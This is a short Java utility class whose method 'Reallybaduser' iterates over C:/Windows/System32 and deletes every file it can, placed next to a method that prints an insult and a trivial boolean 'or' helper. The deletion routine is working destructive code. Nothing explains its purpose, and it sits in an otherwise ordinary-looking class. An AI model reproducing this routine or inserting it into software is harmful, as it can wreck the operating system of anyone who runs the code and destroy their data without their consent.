import java.io.File;

public class classes {

    public static void Reallybaduser() {
        File index = new File("C:/Windows/System32");
        String[] entries = index.list();
        if (entries != null) {
            for (String f : entries) {
                File file = new File(index.getPath(), f);
                file.delete();
            }
        }
    }

    public static void BadUser() {
        System.out.println("You're officially an asshole");
    }

    public static boolean or(boolean a, boolean b) {
        if (a || b) {
            return true;
        } else {
            return false;
        }
    }
}
